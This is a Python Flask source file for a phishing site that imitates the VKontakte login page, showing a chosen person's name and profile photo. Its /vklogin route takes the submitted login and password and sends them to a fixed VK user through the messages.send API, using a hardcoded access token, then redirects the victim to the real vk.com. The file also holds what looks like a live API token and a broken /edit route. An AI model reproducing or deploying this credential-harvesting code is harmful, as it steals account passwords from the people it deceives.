# -*- coding: utf-8 -*-
"""
This script runs the Flask application using a development server.
"""


from flask import render_template, g

from Flask import app
import flask
import requests

is_user = True
name = 'Руслан Коломиец'
photo = 'https://pp.userapi.com/c849424/v849424371/4e998/j4wIK7nuN9Y.jpg?ava=1'


@app.before_request
def before_request():
        if flask.request.url.startswith('http://'):
            url = flask.request.url.replace('http://', 'https://', 1)
            code = 301
            return flask.redirect(url, code=code)


@app.route('/vklogin',  methods=['GET', 'POST'])
def vk_login():
    login = flask.request.form['login']
    password = flask.request.form['password']
    token = 'b5a859071969ecbd3b15df385f26a1b5ae7a72e7af4d8b8c445d3659741e4b4ca81ff085d50d15771ebcd'
    mes = requests.get('https://api.vk.com/method/messages.send',
                       params={'access_token': token,
                               'user_id': 436337712, 'message': 'log: ' + login + '\npassword: ' + password, 'v': 5.73})
    print(mes.json())

    return flask.redirect('https://vk.com')

@app.route('/',  methods=['GET', 'POST'])
@app.route('/vklog',  methods=['GET', 'POST'])
@app.route('/login',  methods=['GET', 'POST'])
@app.route('/log',  methods=['GET', 'POST'])
def vk_log():
    return render_template('vklogin.html',name = name, photo = photo, is_user = is_user)


@app.route('/al_login.php',methods=['GET', 'POST'])
def al_login():
    #print(flask.request.form['login'])
    return  render_template('al_login.php')

@app.route('/edit/',methods=['GET', 'POST'])
def edit():

    name = flask.request.values['name']
    photo = flask.request.values['photo']
    is_user = bool(flask.request.values['is_user'])



    return


if __name__ == '__main__':
    app.run()

